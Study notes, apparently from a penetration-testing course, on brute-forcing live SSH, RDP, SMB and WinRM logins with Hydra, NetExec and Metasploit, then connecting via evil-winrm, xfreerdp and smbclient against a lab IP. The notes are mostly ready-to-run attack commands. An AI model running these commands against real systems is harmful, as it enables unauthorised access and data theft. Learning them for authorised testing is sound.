- Different from hash cracking, this is attacking a live login (SSH, RDP, SMB, WinRM) directly over the network, not an offline hash
- Same idea though, try user:pass combos until one works

---
## Picking a Tool
- **Hydra** - works on almost everything (ssh, rdp, smb, ftp, etc), good default choice
- **NetExec (nxc)** - better for Windows/AD stuff (SMB, WinRM, LDAP, MSSQL), also does post-login enum (shares, users)
- **Metasploit** (`auxiliary/scanner/<service>/<service>_login`) - use when hydra fails or errors out (e.g. old hydra breaks on SMBv3)

---
## General Syntax
```bash
hydra -L user.list -P password.list <protocol>://<target-IP>
netexec <protocol> <target-IP> -u user.list -p password.list
```

---
## WinRM (Windows remote management, port 5985/5986)
```bash
netexec winrm 10.129.42.197 -u user.list -p password.list
```
- `(Pwn3d!)` in the output means we can run commands with that login
- Once we have working creds, connect with Evil-WinRM instead of nxc, it gives us an actual interactive shell

```bash
evil-winrm -i 10.129.42.197 -u user -p password
```

---
## SSH (port 22)
```bash
hydra -L user.list -P password.list ssh://10.129.42.197
ssh user@10.129.42.197
```

---
## RDP (port 3389)
```bash
hydra -L user.list -P password.list rdp://10.129.42.197
xfreerdp /v:10.129.42.197 /u:user /p:password
```

---
## SMB (port 445)
- Hydra sometimes errors on SMBv3 ("invalid reply from target"), use Metasploit's `smb_login` module instead if that happens

```bash
netexec smb 10.129.42.197 -u user -p password --shares
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
- `smbclient` lets us browse/upload/download from a share once we're in, use `ls`, `get`, `put` inside it